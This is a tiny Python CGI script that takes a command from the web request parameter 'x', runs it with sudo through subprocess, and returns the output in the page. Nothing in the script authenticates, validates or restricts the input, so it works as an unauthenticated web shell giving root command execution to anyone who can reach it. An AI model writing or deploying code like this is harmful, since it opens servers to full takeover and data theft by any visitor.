#!/usr/bin/python3
import cgi
import subprocess

print("content-type: text/html")
print()

response = cgi.FieldStorage()

command = response.getvalue("x")
output = subprocess.getoutput('sudo '+command)

print(output)
